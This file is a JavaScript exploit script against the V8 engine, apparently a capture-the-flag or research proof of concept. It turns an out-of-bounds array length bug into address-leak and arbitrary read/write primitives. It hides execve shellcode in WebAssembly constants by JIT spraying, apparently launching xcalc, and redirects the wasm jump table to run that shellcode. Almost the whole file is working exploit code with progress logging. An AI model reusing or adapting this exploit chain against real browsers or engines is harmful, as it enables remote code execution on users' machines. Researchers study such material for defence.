let fi_buf = new ArrayBuffer(8); // shared buffer for float and bigint
let f_buf = new Float64Array(fi_buf); // buffer for float
let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert (big)int to hex string
function hex(i) {
    return `0x${i.toString(16)}`;
}

let oob_arr;
let obj_arr;
let tmp_obj = {};
let typed_arr;

(function layout() {
    oob_arr = [1.1];
    obj_arr = [tmp_obj];
    typed_arr = new BigUint64Array(1);
})();

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`);

// get (compressed) address of |obj|
function addrof(obj) {
    obj_arr[0] = obj;
    return ftoi(oob_arr[4]) & 0xffffffffn;
}

// arbitrary address read/write
function aarw(addr, value = null) {
    oob_arr[23] = itof(addr - 0x7n); // base_pointer of |typed_arr|
    if (value == null) {
        // if |value| is null, read 8 bytes from |addr|
        return typed_arr[0];
    } else {
        // if |value| isn't null, write |value| to |addr|
        typed_arr[0] = value;
    }
}

console.log("[+] JIT spraying...");
let wasm_code = new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0x9f, 0x1, 0x1, 0x9c, 0x1, 0x0, 0x44, 0x48, 0x31, 0xc0, 0x90, 0x90, 0x90, 0xeb, 0x7, 0x44, 0x66, 0xb8, 0x6c, 0x63, 0x50, 0x90, 0xeb, 0x7, 0x44, 0xb8, 0x2f, 0x78, 0x63, 0x61, 0x90, 0xeb, 0x7, 0x44, 0x48, 0xc1, 0xe0, 0x20, 0x90, 0x90, 0xeb, 0x7, 0x44, 0x48, 0x5, 0x2f, 0x62, 0x69, 0x6e, 0xeb, 0x7, 0x44, 0x50, 0x48, 0x89, 0xe7, 0x90, 0x90, 0xeb, 0x7, 0x44, 0x48, 0x31, 0xf6, 0x90, 0x90, 0x90, 0xeb, 0x7, 0x44, 0x90, 0x48, 0x31, 0xc0, 0x90, 0x90, 0xeb, 0xc, 0x44, 0x66, 0xb8, 0x3a, 0x30, 0x50, 0x90, 0xeb, 0xc, 0x44, 0xb8, 0x4c, 0x41, 0x59, 0x3d, 0x90, 0xeb, 0xc, 0x44, 0x90, 0x48, 0xc1, 0xe0, 0x20, 0x90, 0xeb, 0xc, 0x44, 0x48, 0x5, 0x44, 0x49, 0x53, 0x50, 0xeb, 0xc, 0x44, 0x50, 0x48, 0x89, 0xe0, 0x90, 0x90, 0xeb, 0xc, 0x44, 0x48, 0x31, 0xdb, 0x53, 0x50, 0x90, 0xeb, 0xc, 0x44, 0x48, 0x89, 0xe2, 0x90, 0x90, 0x90, 0xeb, 0xc, 0x44, 0x48, 0x31, 0xc0, 0xb0, 0x3b, 0x90, 0xeb, 0xc, 0x44, 0xf, 0x5, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xf, 0xb]);
let wasm_module = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_module);

// get address of rwx region
let wasm_instance_addr = addrof(wasm_instance);
console.log(`[+] wasm_instance_addr == ${hex(wasm_instance_addr)}`);
let rwx = aarw(wasm_instance_addr - 1n + 0x48n);
console.log(`[+] rwx == ${hex(rwx)}`);

// overwrite jump_table_start of |wasm_instance| with address of shellcode
// aarw(wasm_instance_addr - 1n + 0x48n, rwx + 0x84fn); // debug
aarw(wasm_instance_addr - 1n + 0x48n, rwx + 0x81an); // release

// execute shellcode
console.log("[+] Executing shellcode...");
wasm_instance.exports.main();
